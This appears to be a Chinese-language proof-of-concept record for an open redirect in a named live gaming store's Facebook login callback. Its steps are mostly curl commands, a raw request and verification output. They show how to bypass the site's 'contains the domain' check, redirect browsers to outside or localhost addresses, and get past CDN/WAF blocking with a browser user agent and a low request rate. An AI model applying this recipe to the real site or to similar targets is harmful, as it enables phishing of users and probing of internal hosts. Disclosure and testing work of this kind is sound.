# 开放重定向：/Account/FacebookLoginCallback?returnUrl=

**已验证目标**：https://www.greenmangaming.com（finding 169，2026-11-11）
**类型**：反射型开放重定向（CWE-601），服务端原样反射 + 前端 controller 直赋 `location.href`

## 前置条件
1. 目标存在 `/Account/FacebookLoginCallback` 页面，其 AngularJS controller（示例 `FacebookLoginCallbackController`）会把 `/api/v2/facebook/facebook_login_callback` 的响应体字符串直接赋给 `location.href`。
2. 服务端对 `returnUrl` 只做“包含式校验”：URL 任意位置出现目标域名即通过，因此把目标域名塞进外域 URL 的 query 即可绕过。
3. 匿名可达（带受害者会话同样成立）；验证者只需诱导受害者打开构造链接。

## Step 1 — 服务端反射判据（curl）

```bash
# 若该版本要求 XSRF：先访问站点拿 XSRF-TOKEN cookie（该 API 对匿名同样反射）
curl -sk -c ck.txt 'https://www.<target>/Account/FacebookLoginCallback?returnUrl=x' -o /dev/null
XSRF=$(awk '/XSRF-TOKEN/{print $7}' ck.txt)

curl -sk -b ck.txt -X POST \
  -H "X-XSRF-TOKEN: $XSRF" \
  -H 'Accept: application/json' \
  -H 'Content-Type: application/json' \
  'https://www.<target>/api/v2/facebook/facebook_login_callback?returnUrl=http%3A%2F%2Fexample.com%3Fwww.<target>'
```

期望回显（HTTP 200，body 是被原样反射的 JSON 字符串并追加 `cMsg`）：

```json
"http://example.com/?www.<target>&cMsg=eErrorSocialAuthentication"
```

原始请求形态：

```
POST /api/v2/facebook/facebook_login_callback?returnUrl=http%3A%2F%2Fexample.com%3Fwww.greenmangaming.com HTTP/1.1
Host: www.greenmangaming.com
Accept: application/json
X-XSRF-TOKEN: <XSRF-TOKEN cookie 值>
Content-Type: application/json
```

## Step 2 — 前端跳转判据（真实浏览器，缺此步不算成立）

```text
GET https://www.<target>/Account/FacebookLoginCallback?returnUrl=http%3A%2F%2Fexample.com%3Fwww.<target>
Cookie: <受害者会话，可匿名>
```

页面 200 → 页面内 controller POST 上述 API → 把响应体字符串赋给 `location.href`。
用 CDP/Playwright 记录 `Network.requestWillBeSent` 与最终 `document.location.href`：

- 实测 `location.href` 变为 `https://example.com/?www.<target>&cMsg=eErrorSocialAuthentication`
- Network 实际发起对 `https://example.com/` 的 GET，200（`/s.js` 200）

## Step 3 — 内网/本地目标同样被反射

```text
POST /api/v2/facebook/facebook_login_callback?returnUrl=http%3A%2F%2F127.0.0.1%3A1%2F%3Fwww.<target>
→ HTTP 200
"http://127.0.0.1:1/?www.<target>&cMsg=eErrorSocialAuthentication"
```

说明浏览器端可被驱动访问本地/内网地址（端口/服务是否可达另需在受害者浏览器侧验证）。

## 判据（三件套）
1. **服务端反射**：POST 返回 200，body 是完整可控 URL（非空值/错误页），且附加了业务参数（如 `cMsg=`）。
2. **浏览器跳转**：真实浏览器 `location.href` 改变，Network 记录到外域请求 200。
3. **绕过性**：把目标域名从 returnUrl 中移除后应被拒绝（包含式校验的阴性对照，建议复现时补测；本条目未记录该分支原始回显，勿凭空断言）。

## 失败时的常见原因
- `returnUrl` 中没带目标域名 → 被服务端“包含式校验”拦截（这是绕过点，不是漏洞消失）。
- 用 `javascript:` / `data:` 等非 http(s) scheme → 服务端 URL 校验拒绝或 CDN（Fastly）直接 406，本目标未升级为输出编码/XSS。
- 缺 `X-XSRF-TOKEN`（若目标版本强制 XSRF 校验）。
- 裸 curl 的 UA 被 CDN/WAF 拦截 → 带浏览器 UA，单线程低速率。
- 只做 curl 服务端反射、不做真实浏览器验证 → 服务端反射 ≠ 浏览器跳转，不能判定开放重定向成立。